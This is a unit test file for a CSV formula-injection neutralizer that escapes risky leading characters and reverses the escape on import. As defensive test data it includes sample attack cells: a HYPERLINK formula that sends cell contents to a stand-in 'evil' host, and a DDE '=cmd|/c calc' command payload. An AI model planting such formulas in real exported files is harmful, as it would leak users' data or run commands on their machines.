/**
 * Unit tests for the CSV formula-injection (CWE-1236) neutralizer. Pure
 * input→output, no IO. Pins exactly which cells get the leading-quote escape
 * and — just as important — which DON'T (so the export stays faithful).
 */

import { describe, expect, test } from 'bun:test';
import { denormalizeCsvCell, neutralizeCsvCell, neutralizeCsvRow } from '../csv-safety';

describe('neutralizeCsvCell — escapes formula-trigger strings', () => {
  test.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['=HYPERLINK("//evil?"&A1,"x")', '\'=HYPERLINK("//evil?"&A1,"x")'],
    ['\tlead-tab', "'\tlead-tab"],
    ['\rlead-cr', "'\rlead-cr"],
  ])('prefixes %p with a single quote', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });
});

describe('neutralizeCsvCell — leaves safe values untouched', () => {
  test('a plain string is unchanged', () => {
    expect(neutralizeCsvCell('Shell top-up')).toBe('Shell top-up');
  });

  test('an empty string is unchanged (no spurious quote)', () => {
    expect(neutralizeCsvCell('')).toBe('');
  });

  test('a trigger char NOT in first position is inert and left alone', () => {
    expect(neutralizeCsvCell('a=b')).toBe('a=b');
    expect(neutralizeCsvCell('1-2')).toBe('1-2'); // a date-ish string mid-cell
  });

  test('numbers pass through with their type intact (incl. negatives)', () => {
    // The whole point: a legitimately-negative amount must NOT become a string.
    expect(neutralizeCsvCell(-50)).toBe(-50);
    expect(neutralizeCsvCell(52.4)).toBe(52.4);
    expect(neutralizeCsvCell(0)).toBe(0);
  });

  test('booleans / null / undefined pass through unchanged', () => {
    expect(neutralizeCsvCell(true)).toBe(true);
    expect(neutralizeCsvCell(null)).toBe(null);
    expect(neutralizeCsvCell(undefined)).toBe(undefined);
  });
});

describe('neutralizeCsvRow — guards string cells, preserves the rest', () => {
  test('only the dangerous string cells are escaped', () => {
    const out = neutralizeCsvRow({
      amount: -50, // negative number stays numeric
      description: '=cmd|/c calc', // dangerous → escaped
      vehicle: 'Daily Driver', // safe → unchanged
      tags: '@everyone', // dangerous → escaped
      mileage: '', // empty → unchanged
    });
    expect(out).toEqual({
      amount: -50,
      description: "'=cmd|/c calc",
      vehicle: 'Daily Driver',
      tags: "'@everyone",
      mileage: '',
    });
  });

  test('returns a new object (does not mutate the input)', () => {
    const input = { description: '=evil' };
    const out = neutralizeCsvRow(input);
    expect(input.description).toBe('=evil'); // original untouched
    expect(out.description).toBe("'=evil");
  });
});

describe('denormalizeCsvCell — symmetric inverse for round-trip import', () => {
  test.each([
    ["'=1+1", '=1+1'],
    ["'+1", '+1'],
    ["'-1+2", '-1+2'],
    ["'@SUM(A1)", '@SUM(A1)'],
    ["'\tx", '\tx'],
    ["'\rx", '\rx'],
  ])('strips the neutralization prefix: %p → %p', (input, expected) => {
    expect(denormalizeCsvCell(input)).toBe(expected);
  });

  test.each([
    "'24 road trip", // user-typed apostrophe + non-trigger → keep
    "'twas the night", //
    'plain text',
    '=not-prefixed', // a bare formula (never produced by export) is left as-is
    "''=double", // only ONE leading quote is the neutralizer's; strip none here (2nd char is ')
    '', // empty
    "'", // lone apostrophe
  ])('leaves a non-neutralized value untouched: %p', (input) => {
    expect(denormalizeCsvCell(input)).toBe(input);
  });

  test('is the exact inverse of neutralizeCsvCell for trigger strings', () => {
    for (const v of ['=evil', '+1', '-2', '@x', '\tt', '\rr']) {
      expect(denormalizeCsvCell(neutralizeCsvCell(v) as string)).toBe(v);
    }
  });

  test('is idempotent on already-clean values', () => {
    expect(denormalizeCsvCell(denormalizeCsvCell("'=x"))).toBe('=x');
  });
});
